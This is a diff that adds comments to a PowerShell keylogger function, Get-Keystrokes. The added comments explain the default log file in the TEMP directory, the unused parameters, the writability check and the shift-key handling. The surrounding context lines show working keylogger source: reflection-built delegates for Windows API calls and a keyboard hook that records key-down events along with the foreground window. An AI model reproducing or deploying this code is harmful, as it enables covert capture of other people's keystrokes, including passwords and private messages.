@@ -50,17 +50,19 @@ function Get-Keystrokes {
     Param (
         [Parameter(Position = 0)]
         [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
-        [String]$LogPath = "$($env:TEMP)\key.log",
+        [String]$LogPath = "$($env:TEMP)\key.log",  # Default path for keylogged file is in the temp directory
 
         [Parameter(Position = 1)]
-        [Double]$Timeout,
+        [Double]$Timeout,  # Not used in the program
 
         [Parameter()]
-        [Switch]$PassThru
+        [Switch]$PassThru  # Not used in the program
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
 
+    # Check to make sure that the log path is writeable by the script
+    # We do this by starting the key logging file with the header for the file ("TypedKey")
     try { '"TypedKey"' | Out-File -FilePath $LogPath -Encoding unicode }
     catch { throw $_ }
 
@@ -86,6 +88,7 @@ function Get-Keystrokes {
                 $ReturnType = [Void]
             )
 
+	    # Sets up the .NET calls but for powershell
             $Domain = [AppDomain]::CurrentDomain
             $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
             $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
@@ -193,7 +196,9 @@ function Get-Keystrokes {
             if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
             
                 $hWindow = $GetForegroundWindow.Invoke()
-
+                
+		# Determine if any modifications need to be made to the key
+		# we think is being pressed (ex: '4' is actually '$' if shift is pressed
                 $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
                 if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }
                 else { $Shift = $false }
